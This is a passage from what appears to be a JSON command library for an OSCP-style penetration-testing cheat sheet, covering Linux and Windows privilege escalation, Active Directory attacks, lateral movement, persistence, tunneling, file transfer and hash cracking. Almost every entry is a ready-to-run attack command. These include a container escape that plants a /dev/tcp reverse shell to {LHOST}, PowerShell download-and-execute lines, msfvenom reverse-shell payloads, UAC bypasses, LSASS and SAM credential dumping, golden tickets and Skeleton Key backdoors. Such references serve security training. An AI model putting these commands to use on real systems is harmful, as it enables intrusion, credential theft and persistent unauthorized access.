                          "title": "Docker - mounted socket",
                          "command": "ls /var/run/docker.sock\ndocker -H unix:///var/run/docker.sock run -it --rm -v /:/mnt alpine chroot /mnt sh",
                          "tags": [
                              "containers",
                              "crit"
                          ]
                      },
                      {
                          "title": "Docker - privileged escape",
                          "command": "# If --privileged flag set:\nmkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp\nmkdir /tmp/cgrp/x\necho 1 > /tmp/cgrp/x/notify_on_release\nhostpath=$(sed -n 's/.*\\perdir=\\([^,]*\\).*/\\1/p' /etc/mtab)\necho \"$hostpath/cmd\" > /tmp/cgrp/release_agent\necho '#!/bin/bash' > /cmd\necho \"bash -i >& /dev/tcp/{LHOST}/{RPORT} 0>&1\" >> /cmd\nchmod +x /cmd\nsh -c \"echo \\$\\$ > /tmp/cgrp/x/cgroup.procs\"",
                          "tags": [
                              "containers",
                              "crit"
                          ]
                      },
                      {
                          "title": "LXC container escape",
                          "command": "lxc init ubuntu:16.04 test -c security.privileged=true\nlxc config device add test whatever disk source=/ path=/mnt/root recursive=true\nlxc start test\nlxc exec test -- /bin/bash\nmount -o bind / /mnt/root  # then chroot",
                          "tags": [
                              "containers"
                          ]
                      },
                      {
                          "title": "runc CVE-2019-5736",
                          "command": "# Requires write access to /proc/self/exe in container",
                          "tags": [
                              "containers"
                          ]
                      }
                  ]
              },
              {
                  "title": "LD_PRELOAD & Library Hijack",
                  "commands": [
                      {
                          "title": "LD_PRELOAD (sudo env_keep)",
                          "command": "# If sudo preserves LD_PRELOAD:\ncat > /tmp/evil.c << 'EOF'\n#include <stdio.h>\n#include <stdlib.h>\nvoid _init() { setuid(0); system(\"/bin/bash -i\"); }\nEOF\ngcc -shared -nostartfiles -fPIC -o /tmp/evil.so /tmp/evil.c\nsudo LD_PRELOAD=/tmp/evil.so any_allowed_cmd",
                          "tags": []
                      },
                      {
                          "title": "Library hijack (writable path)",
                          "command": "# Find shared lib with missing path:\nstrace CMD 2>&1 | grep 'No such file' | grep '.so'\n# Create fake .so in writable directory in LD_LIBRARY_PATH",
                          "tags": []
                      }
                  ]
              },
              {
                  "title": "Writable /etc/passwd",
                  "commands": [
                      {
                          "title": "Generate password hash",
                          "command": "openssl passwd -1 hacked\n# OR: python3 -c \"import crypt; print(crypt.crypt('hacked','\\$6\\$salt\\$'))\"",
                          "tags": []
                      },
                      {
                          "title": "Append to /etc/passwd",
                          "command": "echo 'hax:HASH_HERE:0:0:root:/root:/bin/bash' >> /etc/passwd\nsu hax  # password: hacked",
                          "tags": []
                      }
                  ]
              },
              {
                  "title": "NFS & Shared Mounts",
                  "commands": [
                      {
                          "title": "NFS no_root_squash",
                          "command": "showmount -e {RHOST}\n# Attacker: mount -o rw,vers=2 {RHOST}:/share /tmp/nfs\ncp /bin/bash /tmp/nfs/bash && chmod +s /tmp/nfs/bash\n# Target: /tmp/nfs/bash -p",
                          "tags": []
                      }
                  ]
              }
          ]
      },
      {
          "id": "wpe",
          "label": "Windows PrivEsc",
          "group": "OSCP+ Core",
          "groups": [
              {
                  "title": "Automated Tools",
                  "commands": [
                      {
                          "title": "WinPEAS",
                          "command": "winpeas.exe > C:\\Temp\\wp.txt 2>&1",
                          "tags": []
                      },
                      {
                          "title": "WinPEAS PS",
                          "command": "IEX(New-Object Net.WebClient).DownloadString('http://{LHOST}/winPEASx64.ps1')",
                          "tags": []
                      },
                      {
                          "title": "PowerUp",
                          "command": "IEX(New-Object Net.WebClient).DownloadString('http://{LHOST}/PowerUp.ps1')\nInvoke-AllChecks | Out-File -Encoding ASCII C:\\Temp\\powerup.txt",
                          "tags": []
                      }
                  ]
              },
              {
                  "title": "Manual Enumeration",
                  "commands": [
                      {
                          "title": "whoami + privileges",
                          "command": "whoami /all",
                          "tags": []
                      },
                      {
                          "title": "System info",
                          "command": "systeminfo",
                          "tags": []
                      },
                      {
                          "title": "Hotfixes (missing patches)",
                          "command": "wmic qfe list brief | findstr /v '3180045'",
                          "tags": []
                      },
                      {
                          "title": "Services",
                          "command": "sc query state= all",
                          "tags": []
                      },
                      {
                          "title": "Network",
                          "command": "netstat -ano && ipconfig /all",
                          "tags": []
                      },
                      {
                          "title": "Installed software",
                          "command": "wmic product get name,version",
                          "tags": []
                      },
                      {
                          "title": "AV products",
                          "command": "wmic /namespace:\\\\root\\SecurityCenter2 path AntiVirusProduct get displayName,productState",
                          "tags": []
                      },
                      {
                          "title": "AppLocker",
                          "command": "Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections",
                          "tags": []
                      },
                      {
                          "title": "CLM check",
                          "command": "$ExecutionContext.SessionState.LanguageMode",
                          "tags": []
                      }
                  ]
              },
              {
                  "title": "Token Impersonation",
                  "commands": [
                      {
                          "title": "Check SeImpersonatePrivilege",
                          "command": "whoami /priv | findstr /i impersonate",
                          "tags": []
                      },
                      {
                          "title": "PrintSpoofer64",
                          "command": "PrintSpoofer64.exe -i -c cmd",
                          "tags": [
                              "crit"
                          ]
                      },
                      {
                          "title": "GodPotato",
                          "command": "GodPotato.exe -cmd \"cmd /c whoami\"",
                          "tags": [
                              "crit"
                          ]
                      },
                      {
                          "title": "GodPotato - add admin",
                          "command": "GodPotato.exe -cmd \"net localgroup Administrators {USER} /add\"",
                          "tags": []
                      },
                      {
                          "title": "JuicyPotatoNG",
                          "command": "JuicyPotatoNG.exe -t * -p C:\\Temp\\shell.exe",
                          "tags": []
                      },
                      {
                          "title": "RoguePotato",
                          "command": "RoguePotato.exe -r {LHOST} -e C:\\Temp\\shell.exe -l 9999",
                          "tags": []
                      },
                      {
                          "title": "SweetPotato",
                          "command": "SweetPotato.exe -a 'whoami'",
                          "tags": [
                              "new"
                          ]
                      },
                      {
                          "title": "EfsPotato",
                          "command": "EfsPotato.exe 'cmd /c whoami'",
                          "tags": [
                              "new"
                          ]
                      },
                      {
                          "title": "Meterpreter incognito",
                          "command": "load incognito\nlist_tokens -u\nimpersonate_token 'DOMAIN\\Admin'",
                          "tags": []
                      }
                  ]
              },
              {
                  "title": "Named Pipes",
                  "commands": [
                      {
                          "title": "Check for writable pipes",
                          "command": "pipelist.exe /accepteula\naccesschk.exe /accepteula -w \\Pipe\\ -v 2>nul",
                          "tags": [
                              "named pipes"
                          ]
                      },
                      {
                          "title": "PrintSpooler pipe abuse",
                          "command": "# SpoolSample.exe to trigger print spooler pipe connection",
                          "tags": [
                              "named pipes"
                          ]
                      },
                      {
                          "title": "Custom pipe server",
                          "command": "# Create named pipe server, wait for SYSTEM process to connect\n# Use NtImpersonateThread after connection",
                          "tags": [
                              "named pipes"
                          ]
                      }
                  ]
              },
              {
                  "title": "Service Misconfigs",
                  "commands": [
                      {
                          "title": "Weak service perms",
                          "command": "accesschk.exe /accepteula -ucqv * 2>nul | findstr ALLOW",
                          "tags": []
                      },
                      {
                          "title": "Unquoted service path",
                          "command": "wmic service get name,pathname,startmode | findstr /i /v unquoted",
                          "tags": []
                      },
                      {
                          "title": "Change binary path",
                          "command": "sc config SVCNAME binpath= \"C:\\Temp\\shell.exe\"\nsc stop SVCNAME && sc start SVCNAME",
                          "tags": []
                      },
                      {
                          "title": "Writable service registry",
                          "command": "accesschk.exe /accepteula -uvwk HKLM\\System\\CurrentControlSet\\Services",
                          "tags": []
                      },
                      {
                          "title": "DLL hijacking - find missing DLLs",
                          "command": "# Run Process Monitor, filter on 'NAME NOT FOUND' + '.dll'\n# Find writable directories in DLL search order",
                          "tags": [
                              "high"
                          ]
                      },
                      {
                          "title": "DLL hijacking - create DLL",
                          "command": "msfvenom -p windows/x64/shell_reverse_tcp LHOST={LHOST} LPORT={LPORT} -f dll -o missing.dll\n# Copy to writable path in service's DLL search order",
                          "tags": [
                              "high"
                          ]
                      }
                  ]
              },
              {
                  "title": "Registry Exploits",
                  "commands": [
                      {
                          "title": "AlwaysInstallElevated",
                          "command": "reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated\nreg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated",
                          "tags": []
                      },
                      {
                          "title": "MSI exploit",
                          "command": "msfvenom -p windows/x64/shell_reverse_tcp LHOST={LHOST} LPORT={LPORT} -f msi -o evil.msi\nmsiexec /quiet /qn /i evil.msi",
                          "tags": []
                      },
                      {
                          "title": "AutoRun keys",
                          "command": "reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\nreg query HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
                          "tags": []
                      },
                      {
                          "title": "Weak registry perms",
                          "command": "Get-Acl HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run | fl",
                          "tags": []
                      }
                  ]
              },
              {
                  "title": "Credentials Hunting",
                  "commands": [
                      {
                          "title": "Mimikatz logonpasswords",
                          "command": "privilege::debug\nsekurlsa::logonpasswords",
                          "tags": []
                      },
                      {
                          "title": "Mimikatz SAM dump",
                          "command": "privilege::debug\ntoken::elevate\nlsadump::sam",
                          "tags": []
                      },
                      {
                          "title": "SAM + SYSTEM + SECURITY",
                          "command": "reg save HKLM\\SAM C:\\Temp\\SAM\nreg save HKLM\\SYSTEM C:\\Temp\\SYSTEM\nreg save HKLM\\SECURITY C:\\Temp\\SECURITY",
                          "tags": []
                      },
                      {
                          "title": "cmdkey creds",
                          "command": "cmdkey /list",
                          "tags": []
                      },
                      {
                          "title": "RunAs saved creds",
                          "command": "runas /savecred /user:{DOMAIN}\\Administrator cmd.exe",
                          "tags": []
                      },
                      {
                          "title": "Search password in files",
                          "command": "findstr /si password *.txt *.xml *.config *.ini 2>nul",
                          "tags": []
                      },
                      {
                          "title": "PowerShell history",
                          "command": "type C:\\Users\\{USER}\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt",
                          "tags": []
                      },
                      {
                          "title": "Unattend.xml",
                          "command": "type C:\\Windows\\Panther\\Unattend.xml 2>nul\ntype C:\\Windows\\sysprep\\sysprep.xml 2>nul",
                          "tags": []
                      },
                      {
                          "title": "WiFi passwords",
                          "command": "netsh wlan show profiles\nnetsh wlan show profile name=\"SSID_NAME\" key=clear",
                          "tags": []
                      },
                      {
                          "title": "Putty sessions",
                          "command": "reg query HKCU\\Software\\SimonTatham\\PuTTY\\Sessions /s",
                          "tags": []
                      },
                      {
                          "title": "WinSCP passwords",
                          "command": "reg query HKCU\\Software\\Martin Prikryl\\WinSCP 2\\Sessions /s",
                          "tags": []
                      },
                      {
                          "title": "DPAPI master key decrypt",
                          "command": "mimikatz dpapi::masterkey /in:MASTERKEY_FILE /rpc",
                          "tags": []
                      }
                  ]
              },
              {
                  "title": "PrintNightmare (CVE-2021-1675)",
                  "commands": [
                      {
                          "title": "Check vulnerability",
                          "command": "Get-Service -Name Spooler\nImport-Module CVE-2021-1675.ps1",
                          "tags": [
                              "crit",
                              "new"
                          ]
                      },
                      {
                          "title": "PrintNightmare LPE",
                          "command": "Invoke-Nightmare -NewUser 'hacker' -NewPassword 'Hacked@123' -DriverName 'PrintMe'",
                          "tags": [
                              "crit"
                          ]
                      },
                      {
                          "title": "PrintNightmare RCE (remote)",
                          "command": "python3 CVE-2021-1675.py {DOMAIN}/{USER}:'{PASS}'@{RHOST} '\\\\{LHOST}\\share\\evil.dll'",
                          "tags": [
                              "crit"
                          ]
                      }
                  ]
              },
              {
                  "title": "UAC Bypass",
                  "commands": [
                      {
                          "title": "UAC check",
                          "command": "whoami /groups | findstr /i 'mandatory label'",
                          "tags": []
                      },
                      {
                          "title": "fodhelper UAC bypass",
                          "command": "# HKCU writable! No admin needed.\nNew-Item 'HKCU:\\Software\\Classes\\ms-settings\\shell\\open\\command' -Force\nNew-ItemProperty -Path 'HKCU:\\Software\\Classes\\ms-settings\\shell\\open\\command' -Name 'DelegateExecute' -Value '' -Force\nSet-ItemProperty -Path 'HKCU:\\Software\\Classes\\ms-settings\\shell\\open\\command' -Name '(default)' -Value 'cmd /c start C:\\Temp\\shell.exe' -Force\nStart-Process 'C:\\Windows\\System32\\fodhelper.exe'",
                          "tags": []
                      },
                      {
                          "title": "CMSTP UAC bypass",
                          "command": "cmstp.exe /ni /s C:\\Temp\\payload.inf",
                          "tags": []
                      },
                      {
                          "title": "eventvwr UAC bypass",
                          "command": "New-Item 'HKCU:\\Software\\Classes\\mscfile\\shell\\open\\command' -Force\nSet-ItemProperty -Path 'HKCU:\\Software\\Classes\\mscfile\\shell\\open\\command' -Name '(default)' -Value 'cmd /c C:\\Temp\\shell.exe' -Force\nStart-Process 'C:\\Windows\\System32\\eventvwr.exe'",
                          "tags": []
                      }
                  ]
              },
              {
                  "title": "LAPS & Credential Access",
                  "commands": [
                      {
                          "title": "LAPS password read (PowerView)",
                          "command": "Get-DomainComputer | Where-Object { $_.'ms-mcs-admpwd' } | Select-Object name,'ms-mcs-admpwd'",
                          "tags": [
                              "new"
                          ]
                      },
                      {
                          "title": "LAPS all passwords",
                          "command": "Get-AdmPwdPassword -ComputerName '*' | Select ComputerName,Password",
                          "tags": [
                              "new"
                          ]
                      },
                      {
                          "title": "LAPS via CME",
                          "command": "crackmapexec ldap {DC} -u {USER} -p '{PASS}' -M laps",
                          "tags": []
                      }
                  ]
              }
          ]
      },
      {
          "id": "adrecon",
          "label": "AD Recon",
          "group": "Active Directory",
          "groups": [
              {
                  "title": "Initial Recon",
                  "commands": [
                      {
                          "title": "CME full enum",
                          "command": "crackmapexec smb {DC} -u {USER} -p '{PASS}' --users --groups --shares --pass-pol",
                          "tags": []
                      },
                      {
                          "title": "BloodHound.py",
                          "command": "bloodhound-python -u {USER} -p '{PASS}' -d {DOMAIN} -ns {DC} -c All --zip",
                          "tags": []
                      },
                      {
                          "title": "BloodHound stealth",
                          "command": "bloodhound-python -u {USER} -p '{PASS}' -d {DOMAIN} -ns {DC} -c DCOnly --zip",
                          "tags": []
                      },
                      {
                          "title": "LDAP all users",
                          "command": "ldapsearch -x -H ldap://{DC} -D '{USER}@{DOMAIN}' -w '{PASS}' -b 'dc=corp,dc=local' '(objectClass=user)' sAMAccountName",
                          "tags": []
                      }
                  ]
              },
              {
                  "title": "PowerView",
                  "commands": [
                      {
                          "title": "Load",
                          "command": "IEX(New-Object Net.WebClient).DownloadString('http://{LHOST}/PowerView.ps1')",
                          "tags": []
                      },
                      {
                          "title": "Passwords in description",
                          "command": "Get-DomainUser | Where{$_.description} | select samaccountname,description",
                          "tags": []
                      },
                      {
                          "title": "Kerberoastable",
                          "command": "Get-DomainUser -SPN | select samaccountname,serviceprincipalname",
                          "tags": []
                      },
                      {
                          "title": "ASREPRoastable",
                          "command": "Get-DomainUser -PreauthNotRequired | select samaccountname",
                          "tags": []
                      },
                      {
                          "title": "ACL misconfigs",
                          "command": "Find-InterestingDomainAcl -ResolveGUIDs | select IdentityReferenceName,ObjectDN,ActiveDirectoryRights",
                          "tags": []
                      },
                      {
                          "title": "Unconstrained delegation",
                          "command": "Get-DomainComputer -Unconstrained | select name,dnshostname",
                          "tags": []
                      },
                      {
                          "title": "Constrained delegation",
                          "command": "Get-DomainUser -TrustedToAuth | select samaccountname,msds-allowedtodelegateto",
                          "tags": []
                      },
                      {
                          "title": "Domain trusts",
                          "command": "Get-DomainTrust | select SourceName,TargetName,TrustDirection",
                          "tags": []
                      },
                      {
                          "title": "LAPS readable passwords",
                          "command": "Get-DomainComputer | Where-Object { $_.'ms-mcs-admpwd' } | Select name,'ms-mcs-admpwd'",
                          "tags": []
                      }
                  ]
              }
          ]
      },
      {
          "id": "adatk",
          "label": "AD Attacks",
          "group": "Active Directory",
          "groups": [
              {
                  "title": "Password Spraying",
                  "commands": [
                      {
                          "title": "Kerbrute spray",
                          "command": "kerbrute passwordspray --dc {DC} -d {DOMAIN} users.txt '{PASS}'",
                          "tags": []
                      },
                      {
                          "title": "CME spray",
                          "command": "crackmapexec smb {DC} -u users.txt -p '{PASS}' --continue-on-success",
                          "tags": []
                      }
                  ]
              },
              {
                  "title": "Kerberoasting",
                  "commands": [
                      {
                          "title": "GetUserSPNs",
                          "command": "impacket-GetUserSPNs {DOMAIN}/{USER}:'{PASS}' -dc-ip {DC} -request -outputfile kerb_hashes.txt",
                          "tags": []
                      },
                      {
                          "title": "Rubeus opsec",
                          "command": "Rubeus.exe kerberoast /tgtdeleg /rc4opsec /outfile:kerb.txt",
                          "tags": []
                      },
                      {
                          "title": "Crack 13100",
                          "command": "hashcat -m 13100 kerb_hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule",
                          "tags": []
                      }
                  ]
              },
              {
                  "title": "ASREPRoast",
                  "commands": [
                      {
                          "title": "GetNPUsers (no creds)",
                          "command": "impacket-GetNPUsers {DOMAIN}/ -usersfile users.txt -format hashcat -outputfile asrep.txt -dc-ip {DC}",
                          "tags": []
                      },
                      {
                          "title": "Crack 18200",
                          "command": "hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule",
                          "tags": []
                      }
                  ]
              },
              {
                  "title": "Relay & Poisoning",
                  "commands": [
                      {
                          "title": "Responder",
                          "command": "sudo responder -I eth0 -dwv",
                          "tags": []
                      },
                      {
                          "title": "Crack NTLMv2",
                          "command": "hashcat -m 5600 /usr/share/responder/logs/*.txt /usr/share/wordlists/rockyou.txt",
                          "tags": []
                      },
                      {
                          "title": "ntlmrelayx SAM",
                          "command": "impacket-ntlmrelayx -tf relay_targets.txt -smb2support",
                          "tags": []
                      },
                      {
                          "title": "ntlmrelayx SOCKS",
                          "command": "impacket-ntlmrelayx -tf relay_targets.txt -smb2support -socks",
                          "tags": []
                      },
                      {
                          "title": "ntlmrelayx LDAP",
                          "command": "impacket-ntlmrelayx -t ldap://{DC} --escalate-user {USER}",
                          "tags": []
                      },
                      {
                          "title": "mitm6 + LDAP relay",
                          "command": "sudo mitm6 -d {DOMAIN} --ignore-nofqdn &\nimpacket-ntlmrelayx -6 -t ldaps://{DC} --delegate-access --add-computer HACKER_PC$",
                          "tags": []
                      }
                  ]
              },
              {
                  "title": "DCSync & Dump",
                  "commands": [
                      {
                          "title": "secretsdump full",
                          "command": "impacket-secretsdump {DOMAIN}/{USER}:'{PASS}'@{DC}",
                          "tags": []
                      },
                      {
                          "title": "secretsdump krbtgt",
                          "command": "impacket-secretsdump {DOMAIN}/{USER}:'{PASS}'@{DC} -just-dc-user krbtgt",
                          "tags": []
                      },
                      {
                          "title": "VSS NTDS (stealthy)",
                          "command": "vssadmin create shadow /for=C:\ncmd /c copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\NTDS\\ntds.dit C:\\Temp\\\ncmd /c copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SYSTEM C:\\Temp\\",
                          "tags": []
                      },
                      {
                          "title": "Offline parse",
                          "command": "impacket-secretsdump -system SYSTEM -ntds ntds.dit LOCAL",
                          "tags": []
                      }
                  ]
              },
              {
                  "title": "Advanced AD Attacks",
                  "commands": [
                      {
                          "title": "ZeroLogon check",
                          "command": "python3 zerologon_check.py dc01 {DC}",
                          "tags": []
                      },
                      {
                          "title": "NoPac instant DA",
                          "command": "python3 noPac.py {DOMAIN}/{USER}:'{PASS}' -dc-ip {DC} -dc-host dc01 -shell --impersonate administrator",
                          "tags": [
                              "crit"
                          ]
                      },
                      {
                          "title": "Certipy find vulns",
                          "command": "certipy find -u {USER}@{DOMAIN} -p '{PASS}' -dc-ip {DC} -vulnerable -stdout",
                          "tags": []
                      },
                      {
                          "title": "Certipy ESC1",
                          "command": "certipy req -u {USER}@{DOMAIN} -p '{PASS}' -dc-ip {DC} -target ca01.{DOMAIN} -template UserCert -upn administrator@{DOMAIN}",
                          "tags": []
                      },
                      {
                          "title": "Certipy auth",
                          "command": "certipy auth -pfx administrator.pfx -domain {DOMAIN} -dc-ip {DC}",
                          "tags": []
                      },
                      {
                          "title": "WriteDACL -> DCSync",
                          "command": "Add-DomainObjectAcl -TargetIdentity 'DC=corp,DC=local' -PrincipalIdentity {USER} -Rights DCSync",
                          "tags": []
                      },
                      {
                          "title": "GenericAll -> password change",
                          "command": "Set-DomainUserPassword -Identity TARGET -AccountPassword (ConvertTo-SecureString 'NewPass@123' -AsPlainText -Force)",
                          "tags": []
                      },
                      {
                          "title": "Coerce - PetitPotam",
                          "command": "python3 PetitPotam.py -u {USER} -p '{PASS}' -d {DOMAIN} {LHOST} {DC}",
                          "tags": [
                              "new"
                          ]
                      },
                      {
                          "title": "Coerce - Coercer all methods",
                          "command": "coercer coerce -t {DC} -l {LHOST} -u {USER} -p '{PASS}' -d {DOMAIN}",
                          "tags": [
                              "new"
                          ]
                      }
                  ]
              }
          ]
      },
      {
          "id": "adlat",
          "label": "AD Lateral",
          "group": "Active Directory",
          "groups": [
              {
                  "title": "Pass-the-Hash",
                  "commands": [
                      {
                          "title": "CME bulk PtH",
                          "command": "crackmapexec smb 192.168.1.0/24 -u {USER} -H :{HASH} --local-auth",
                          "tags": []
                      },
                      {
                          "title": "psexec PtH",
                          "command": "impacket-psexec {DOMAIN}/{USER}@{RHOST} -hashes :{HASH}",
                          "tags": []
                      },
                      {
                          "title": "wmiexec PtH",
                          "command": "impacket-wmiexec {DOMAIN}/{USER}@{RHOST} -hashes :{HASH}",
                          "tags": []
                      },
                      {
                          "title": "evil-winrm hash",
                          "command": "evil-winrm -i {RHOST} -u {USER} -H {HASH}",
                          "tags": []
                      },
                      {
                          "title": "xfreerdp PtH",
                          "command": "xfreerdp /v:{RHOST} /u:{USER} /pth:{HASH} /cert-ignore",
                          "tags": []
                      }
                  ]
              },
              {
                  "title": "Kerberos",
                  "commands": [
                      {
                          "title": "Overpass-the-hash",
                          "command": "impacket-getTGT {DOMAIN}/{USER} -hashes :{HASH}\nexport KRB5CCNAME={USER}.ccache",
                          "tags": []
                      },
                      {
                          "title": "psexec Kerberos",
                          "command": "impacket-psexec {DOMAIN}/{USER}@dc01.{DOMAIN} -k -no-pass",
                          "tags": []
                      },
                      {
                          "title": "Rubeus PtT",
                          "command": "Rubeus.exe ptt /ticket:BASE64_TICKET",
                          "tags": []
                      },
                      {
                          "title": "Golden Ticket (Linux)",
                          "command": "impacket-ticketer -nthash KRBTGT_HASH -domain-sid DOMAIN_SID -domain {DOMAIN} -duration 3650 FakeAdmin\nexport KRB5CCNAME=FakeAdmin.ccache",
                          "tags": []
                      },
                      {
                          "title": "Golden Ticket (Windows)",
                          "command": "kerberos::golden /user:FakeAdmin /domain:{DOMAIN} /sid:DOMAIN_SID /krbtgt:KRBTGT_HASH /ticket:golden.kirbi\nkerberos::ptt golden.kirbi",
                          "tags": []
                      },
                      {
                          "title": "Diamond Ticket",
                          "command": "Rubeus.exe diamond /tgtdeleg /ticketuser:{USER} /groups:512 /krbkey:AES256_KRBTGT /nowrap",
                          "tags": []
                      }
                  ]
              },
              {
                  "title": "Credential Dumping",
                  "commands": [
                      {
                          "title": "LSASS dump (comsvcs - no tools!)",
                          "command": "tasklist /fi 'imagename eq lsass.exe'\nrundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump LSASS_PID C:\\Temp\\lsass.dmp full",
                          "tags": []
                      },
                      {
                          "title": "pypykatz parse (Linux)",
                          "command": "pypykatz lsa minidump lsass.dmp",
                          "tags": []
                      },
                      {
                          "title": "Mimikatz",
                          "command": "privilege::debug\nsekurlsa::logonpasswords",
                          "tags": []
                      }
                  ]
              }
          ]
      },
      {
          "id": "adpst",
          "label": "Persistence",
          "group": "Active Directory",
          "groups": [
              {
                  "title": "AD Backdoors",
                  "commands": [
                      {
                          "title": "AdminSDHolder",
                          "command": "Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=corp,DC=local' -PrincipalIdentity {USER} -Rights All",
                          "tags": []
                      },
                      {
                          "title": "DSRM enable network",
                          "command": "New-ItemProperty 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\' -Name 'DsrmAdminLogonBehavior' -Value 2 -PropertyType DWORD -Force",
                          "tags": []
                      },
                      {
                          "title": "Skeleton Key",
                          "command": "privilege::debug\nmisc::skeleton",
                          "tags": []
                      },
                      {
                          "title": "Custom SSP (password log)",
                          "command": "privilege::debug\nmisc::memssp\n# Logs to C:\\Windows\\System32\\mimilsa.log",
                          "tags": []
                      },
                      {
                          "title": "Silver Ticket CIFS",
                          "command": "kerberos::golden /user:Administrator /domain:{DOMAIN} /sid:DOMAIN_SID /target:{RHOST} /service:cifs /rc4:SVC_HASH /ticket:silver.kirbi",
                          "tags": []
                      }
                  ]
              }
          ]
      },
      {
          "id": "tunnel",
          "label": "Tunneling",
          "group": "OSCP+ Core",
          "groups": [
              {
                  "title": "SSH Tunneling",
                  "commands": [
                      {
                          "title": "Local port forward",
                          "command": "ssh -L {LPORT}:INTERNAL_IP:INTERNAL_PORT {USER}@{RHOST} -N",
                          "tags": []
                      },
                      {
                          "title": "Remote port forward",
                          "command": "ssh -R {RPORT}:127.0.0.1:{LPORT} {USER}@{RHOST} -N",
                          "tags": []
                      },
                      {
                          "title": "Dynamic SOCKS5",
                          "command": "ssh -D 1080 {USER}@{RHOST} -N",
                          "tags": []
                      },
                      {
                          "title": "Double hop",
                          "command": "ssh -J {USER}@{RHOST} {USER}@INTERNAL_HOST",
                          "tags": []
                      }
                  ]
              },
              {
                  "title": "Chisel",
                  "commands": [
                      {
                          "title": "Server (attacker)",
                          "command": "./chisel server -p 8080 --reverse",
                          "tags": []
                      },
                      {
                          "title": "SOCKS (target)",
                          "command": "./chisel client {LHOST}:8080 R:socks",
                          "tags": []
                      },
                      {
                          "title": "Port forward",
                          "command": "./chisel client {LHOST}:8080 R:{LPORT}:127.0.0.1:{RPORT}",
                          "tags": []
                      }
                  ]
              },
              {
                  "title": "Ligolo-ng",
                  "commands": [
                      {
                          "title": "Server",
                          "command": "./proxy -selfcert -laddr 0.0.0.0:11601",
                          "tags": []
                      },
                      {
                          "title": "Agent",
                          "command": "./agent -connect {LHOST}:11601 -ignore-cert",
                          "tags": []
                      },
                      {
                          "title": "Add route",
                          "command": "sudo ip route add 192.168.2.0/24 dev ligolo",
                          "tags": []
                      }
                  ]
              },
              {
                  "title": "Proxychains",
                  "commands": [
                      {
                          "title": "Config",
                          "command": "echo 'socks5 127.0.0.1 1080' >> /etc/proxychains4.conf",
                          "tags": []
                      },
                      {
                          "title": "Nmap via proxychains",
                          "command": "proxychains nmap -sT -Pn -p 22,80,443,445 192.168.2.10",
                          "tags": []
                      },
                      {
                          "title": "Impacket via proxychains",
                          "command": "proxychains impacket-psexec {DOMAIN}/{USER}@192.168.2.10 -hashes :{HASH}",
                          "tags": []
                      }
                  ]
              }
          ]
      },
      {
          "id": "transfer",
          "label": "File Transfer",
          "group": "OSCP+ Core",
          "groups": [
              {
                  "title": "Serve",
                  "commands": [
                      {
                          "title": "Python3 HTTP",
                          "command": "python3 -m http.server 80",
                          "tags": []
                      },
                      {
                          "title": "Impacket SMB",
                          "command": "impacket-smbserver share $(pwd) -smb2support",
                          "tags": []
                      },
                      {
                          "title": "SMB with auth",
                          "command": "impacket-smbserver share $(pwd) -smb2support -username {USER} -password {PASS}",
                          "tags": []
                      }
                  ]
              },
              {
                  "title": "Windows Download",
                  "commands": [
                      {
                          "title": "PowerShell WebClient",
                          "command": "(New-Object Net.WebClient).DownloadFile('http://{LHOST}/file.exe','C:\\Temp\\file.exe')",
                          "tags": []
                      },
                      {
                          "title": "Invoke-WebRequest",
                          "command": "Invoke-WebRequest -Uri 'http://{LHOST}/file.exe' -OutFile 'C:\\Temp\\file.exe'",
                          "tags": []
                      },
                      {
                          "title": "certutil",
                          "command": "certutil.exe -urlcache -split -f http://{LHOST}/file.exe C:\\Temp\\file.exe",
                          "tags": []
                      },
                      {
                          "title": "curl (Win10+)",
                          "command": "curl -o C:\\Temp\\file.exe http://{LHOST}/file.exe",
                          "tags": []
                      },
                      {
                          "title": "SMB copy",
                          "command": "copy \\\\{LHOST}\\share\\file.exe C:\\Temp\\file.exe",
                          "tags": []
                      }
                  ]
              },
              {
                  "title": "Linux Download",
                  "commands": [
                      {
                          "title": "wget",
                          "command": "wget http://{LHOST}/file -O /tmp/file",
                          "tags": []
                      },
                      {
                          "title": "curl",
                          "command": "curl http://{LHOST}/file -o /tmp/file",
                          "tags": []
                      },
                      {
                          "title": "Base64 (no tools)",
                          "command": "# Attacker: base64 -w0 file.exe\n# Target: echo 'BASE64' | base64 -d > /tmp/file && chmod +x /tmp/file",
                          "tags": []
                      }
                  ]
              }
          ]
      },
      {
          "id": "crack",
          "label": "Hash Cracking",
          "group": "Post-Exploitation",
          "groups": [
              {
                  "title": "Hashcat Modes",
                  "commands": [
                      {
                          "title": "NTLM (1000)",
                          "command": "hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt",
                          "tags": []
                      },
                      {
                          "title": "NTLMv2 (5600)",
                          "command": "hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt",
                          "tags": []
                      },
                      {
                          "title": "Kerberoast RC4 (13100)",
                          "command": "hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule",
                          "tags": []
                      },
                      {
                          "title": "ASREPRoast (18200)",
                          "command": "hashcat -m 18200 hashes.txt /usr/share/wordlists/rockyou.txt",
                          "tags": []
                      },
                      {
                          "title": "MD5 (0)",
                          "command": "hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt",
                          "tags": []
                      },
                      {
                          "title": "SHA1 (100)",
                          "command": "hashcat -m 100 hashes.txt /usr/share/wordlists/rockyou.txt",
                          "tags": []
                      },
                      {
